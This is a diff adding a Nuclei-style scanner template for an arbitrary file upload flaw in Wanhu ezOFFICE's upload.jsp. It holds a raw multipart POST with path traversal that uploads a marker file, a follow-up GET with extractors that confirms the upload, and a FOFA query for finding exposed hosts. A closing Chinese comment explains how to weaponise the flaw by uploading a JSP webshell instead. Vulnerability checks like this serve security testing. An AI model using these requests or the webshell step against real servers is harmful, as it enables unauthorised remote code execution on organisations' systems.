@@ -1,0 +1,57 @@
+id: wanhu-ezoffice-upload-jsp-fileupload
+
+info:
+  name: 万户ezoffice upload.jsp存在任意文件上传
+  author: xiuxin
+  severity: critical
+  description: 万户ezoffice upload.jsp存在任意文件上传
+  reference:
+    - none
+  tags: wanhu,oa,fileupload,ezoffice
+  metadata:
+    fofa-query: app="万户网络-ezOFFICE"
+    verified: true
+    max-request: 1
+http:
+  - raw:
+      - |              
+        POST /defaultroot/platform/portal/layout/common/upload.jsp?portletSettingId=1&path=../platform/portal/com/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/116.0.0.0Safari/537.36
+        Connection: close
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundarykIU0ZM0wGHiH6FRd
+        Content-Length: 245
+        
+        ------WebKitFormBoundarykIU0ZM0wGHiH6FRd
+        Content-Disposition:form-data;name="file";filename="cnvd.txt"
+        content-type:image/pne
+        
+        www.cnvd.org.cn
+        ------WebKitFormBoundarykIU0ZM0wGHiH6FRd--
+
+      - |
+        GET /defaultroot/platform/portal/com/{{path}}/{{file}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
+
+    extractors:
+      - type: regex
+        name: path
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - "'(\\d{6})"
+
+      - type: regex
+        name: file
+        part: body
+        internal: true
+        regex:
+          - '[0-9]{25}.txt'
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body,'www.cnvd.org.cn')"
+
+# 利用请将cnvd.txt改成cnvd.jsp 内容改为马子
